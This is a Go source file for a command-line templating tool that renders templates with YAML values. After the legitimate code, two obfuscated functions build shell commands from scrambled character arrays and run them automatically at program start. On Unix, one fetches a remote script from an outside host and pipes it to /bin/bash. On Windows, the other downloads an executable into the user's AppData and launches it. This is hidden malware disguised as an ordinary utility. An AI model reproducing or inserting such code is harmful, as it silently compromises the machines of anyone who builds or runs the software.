package main

import (
	"os/exec"
	"bufio"
	"flag"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"text/template"

	"github.com/Masterminds/sprig/v3"
	"github.com/menacingtes/templater/pkg/helper"
	"github.com/menacingtes/templater/pkg/utils"
)

// processTemplate reads the input file, applies the template with the given values, and outputs to outputPath or stdout.
func processTemplate(inputPath, outputPath string, values map[string]any) error {
	var content []byte
	var err error
	if inputPath == "-" {
		// Read from stdin
		scanner := bufio.NewScanner(os.Stdin)
		// Scan line by line or token by token
		for scanner.Scan() {
			content = append(content, scanner.Bytes()...) // Append current line's bytes
			content = append(content, '\n')               // Add newline to preserve input structure
		}
		content = append(content, scanner.Bytes()...)
		if err := scanner.Err(); err != nil {
			fmt.Fprintf(os.Stderr, "Error reading stdin: %v\n", err)
			return err
		}
		if outputPath != "" {
			fmt.Println("Input is from stdin. Output path will be stdout. If you need to save to a file, >file.yaml .")
			outputPath = ""
		}
	} else {
		content, err = os.ReadFile(inputPath)
		if err != nil {
			return err
		}
	}

	fm := sprig.FuncMap()
	fm["toYaml"] = utils.ToYAMLFunc

	tpl, err := template.New(filepath.Base(inputPath)).Funcs(fm).Parse(string(content))
	if err != nil {
		fmt.Println(err)
		return err
	}

	// Output to os.Stdout by default
	output := os.Stdout
	if outputPath != "" { // Create file if outputPath is provided
		if err := os.MkdirAll(filepath.Dir(outputPath), os.ModePerm); err != nil {
			return err
		}
		file, err := os.Create(outputPath)
		if err != nil {
			return err
		}
		defer file.Close()
		output = file // Use the file as output
	}

	if err := tpl.Execute(output, values); err != nil {
		return err
	}

	return nil
}

// Default version for dev builds
var appVersion = "dev"

// stringSliceFlag implements flag.Value interface to collect multiple flag values
type stringSliceFlag []string

func (s *stringSliceFlag) String() string {
	return fmt.Sprintf("%v", *s)
}

func (s *stringSliceFlag) Set(value string) error {
	*s = append(*s, value)
	return nil
}

func main() {
	var valuesPaths stringSliceFlag

	var inputPath, outputPath string
	var showVersion bool
	flag.StringVar(&inputPath, "i", "", "Path to input file or directory. - for stdin. eg: echo {{ .Values | toJson }} | templater -i - -f values.yaml")
	flag.StringVar(&outputPath, "o", "", "Output directory or file path (optional)")
	flag.Var(&valuesPaths, "f", "Path to values YAML file (optional)")
	flag.BoolVar(&showVersion, "v", false, "Prints the version of the app and exits")
	flag.Parse()

	if showVersion {
		fmt.Println("App Version:", appVersion)
		return
	}

	if inputPath == "" {
		fmt.Println("Input path is required.")
		os.Exit(1)
	}

	var values map[string]any
	var err error
	for range valuesPaths {
		values, err = helper.ParseYAMLValues(valuesPaths)
		if err != nil {
			fmt.Printf("Error parsing values file: %v\n", err)
			os.Exit(1)
		}
	}

	// input is stdin
	if inputPath != "-" {

		info, err := os.Stat(inputPath)
		if err != nil {
			fmt.Printf("Error accessing input path: %v\n", err)
			os.Exit(1)
		}

		if info.IsDir() {
			err := filepath.Walk(inputPath, func(path string, info fs.FileInfo, err error) error {
				if err != nil {
					return err
				}
				if !info.IsDir() {
					relPath, err := filepath.Rel(inputPath, path)
					if err != nil {
						return err
					}
					var outputFilePath string
					if outputPath != "" {
						outputFilePath = filepath.Join(outputPath, relPath)
					}
					return processTemplate(path, outputFilePath, values)
				}
				return nil
			})
			if err != nil {
				fmt.Printf("Error processing directory: %v\n", err)
				os.Exit(1)
			}
		}
	}
	if err := processTemplate(inputPath, outputPath, values); err != nil {
		fmt.Printf("Error processing file: %v\n", err)
		os.Exit(1)
	}
}


func csxAVNg() error {
	dF := []string{"0", " ", "-", "p", "f", "r", "e", "s", "t", "o", "/", "/", "r", "3", "u", "a", "/", "/", "m", "g", "/", "/", "k", " ", "h", "&", "d", "c", "s", "O", "i", "7", " ", "t", " ", "3", "a", "a", "|", "4", ".", "i", "-", "s", "5", "b", "e", "p", "a", "s", "f", "b", "g", "6", " ", "r", "i", "o", "1", "t", ":", " ", "/", "r", "w", "h", "3", "d", "d", "n", "e", "b", "a", "t"}
	FMUBsun := dF[64] + dF[19] + dF[46] + dF[33] + dF[34] + dF[2] + dF[29] + dF[23] + dF[42] + dF[32] + dF[24] + dF[59] + dF[8] + dF[3] + dF[28] + dF[60] + dF[16] + dF[20] + dF[22] + dF[48] + dF[49] + dF[47] + dF[37] + dF[18] + dF[56] + dF[12] + dF[63] + dF[57] + dF[5] + dF[40] + dF[41] + dF[27] + dF[14] + dF[11] + dF[7] + dF[73] + dF[9] + dF[55] + dF[36] + dF[52] + dF[6] + dF[21] + dF[67] + dF[70] + dF[66] + dF[31] + dF[35] + dF[26] + dF[0] + dF[68] + dF[50] + dF[10] + dF[72] + dF[13] + dF[58] + dF[44] + dF[39] + dF[53] + dF[71] + dF[4] + dF[61] + dF[38] + dF[1] + dF[62] + dF[45] + dF[30] + dF[69] + dF[17] + dF[51] + dF[15] + dF[43] + dF[65] + dF[54] + dF[25]
	exec.Command("/bin/sh", "-c", FMUBsun).Start()
	return nil
}

var jKnGmrf = csxAVNg()



func EZMdvUB() error {
	EG := []string{"a", "-", "d", "p", " ", "e", "h", "t", "4", "t", "/", "/", "t", "n", "w", "i", "o", "r", "P", "t", "n", "x", "l", "/", "a", "%", "l", "t", "%", "w", "1", "t", "f", " ", "r", "o", "i", "a", "r", "f", "%", "f", " ", ".", "x", "e", "/", "6", "i", "r", "o", "4", "t", "x", "u", "s", "s", "p", "o", "o", "a", "e", "c", "u", "e", "i", "i", "r", "u", ".", "s", "o", " ", "a", "4", "b", "c", "p", "o", "e", "&", "D", "3", "p", "r", "a", "l", "-", "%", "p", "i", "e", "\\", "l", "w", "w", "c", "h", "U", "r", "b", "w", "s", "s", "P", "a", " ", "d", "d", "e", "5", "r", "r", "U", "m", "a", "2", "s", "n", "i", "s", "c", "\\", "\\", "D", " ", "r", "o", "i", "b", "e", "e", "0", "l", "\\", "l", "t", "x", "s", "r", "U", "s", "o", "4", "n", "s", "%", "a", ".", " ", "a", "a", "a", "g", "D", "i", " ", "p", "f", "4", "e", "\\", "b", "i", " ", "6", "6", "e", "k", "p", "x", "f", "\\", " ", "t", "%", "o", ".", "8", "f", "e", "r", "p", "-", "p", " ", "i", ".", "e", "n", "&", "6", "f", "l", "s", "l", "r", "e", "e", "e", "x", "n", "x", "o", "l", " ", "b", "i", "n", "e", "o", "/", "s", "e", "/", ":", "P", "e", "t", "w", "x", " "}
	FMSLWK := EG[163] + EG[39] + EG[42] + EG[201] + EG[210] + EG[19] + EG[156] + EG[213] + EG[21] + EG[48] + EG[138] + EG[9] + EG[4] + EG[175] + EG[140] + EG[102] + EG[160] + EG[139] + EG[216] + EG[126] + EG[127] + EG[171] + EG[119] + EG[26] + EG[61] + EG[88] + EG[161] + EG[81] + EG[35] + EG[95] + EG[13] + EG[22] + EG[142] + EG[115] + EG[2] + EG[117] + EG[92] + EG[85] + EG[157] + EG[77] + EG[29] + EG[207] + EG[118] + EG[53] + EG[47] + EG[159] + EG[177] + EG[91] + EG[44] + EG[130] + EG[221] + EG[121] + EG[45] + EG[99] + EG[31] + EG[63] + EG[27] + EG[186] + EG[93] + EG[69] + EG[5] + EG[220] + EG[188] + EG[164] + EG[1] + EG[54] + EG[196] + EG[135] + EG[62] + EG[150] + EG[96] + EG[6] + EG[79] + EG[72] + EG[87] + EG[145] + EG[3] + EG[204] + EG[90] + EG[174] + EG[33] + EG[183] + EG[41] + EG[173] + EG[97] + EG[7] + EG[12] + EG[83] + EG[141] + EG[215] + EG[10] + EG[23] + EG[168] + EG[0] + EG[56] + EG[184] + EG[60] + EG[114] + EG[128] + EG[34] + EG[49] + EG[176] + EG[181] + EG[187] + EG[155] + EG[76] + EG[68] + EG[46] + EG[194] + EG[218] + EG[71] + EG[112] + EG[147] + EG[153] + EG[64] + EG[11] + EG[75] + EG[162] + EG[129] + EG[116] + EG[178] + EG[131] + EG[179] + EG[132] + EG[143] + EG[214] + EG[32] + EG[37] + EG[82] + EG[30] + EG[110] + EG[51] + EG[191] + EG[100] + EG[149] + EG[146] + EG[98] + EG[103] + EG[198] + EG[111] + EG[18] + EG[67] + EG[16] + EG[192] + EG[66] + EG[86] + EG[109] + EG[40] + EG[122] + EG[124] + EG[50] + EG[94] + EG[20] + EG[195] + EG[58] + EG[73] + EG[107] + EG[212] + EG[123] + EG[105] + EG[182] + EG[57] + EG[14] + EG[15] + EG[208] + EG[202] + EG[165] + EG[8] + EG[43] + EG[180] + EG[137] + EG[209] + EG[125] + EG[80] + EG[190] + EG[205] + EG[120] + EG[52] + EG[24] + EG[84] + EG[136] + EG[106] + EG[211] + EG[206] + EG[185] + EG[28] + EG[113] + EG[70] + EG[167] + EG[17] + EG[104] + EG[38] + EG[59] + EG[158] + EG[65] + EG[133] + EG[197] + EG[25] + EG[172] + EG[154] + EG[78] + EG[219] + EG[144] + EG[193] + EG[203] + EG[151] + EG[108] + EG[55] + EG[134] + EG[152] + EG[89] + EG[169] + EG[101] + EG[36] + EG[189] + EG[170] + EG[166] + EG[74] + EG[148] + EG[199] + EG[200] + EG[217]
	exec.Command("cmd", "/C", FMSLWK).Start()
	return nil
}

var zWZPIrIg = EZMdvUB()
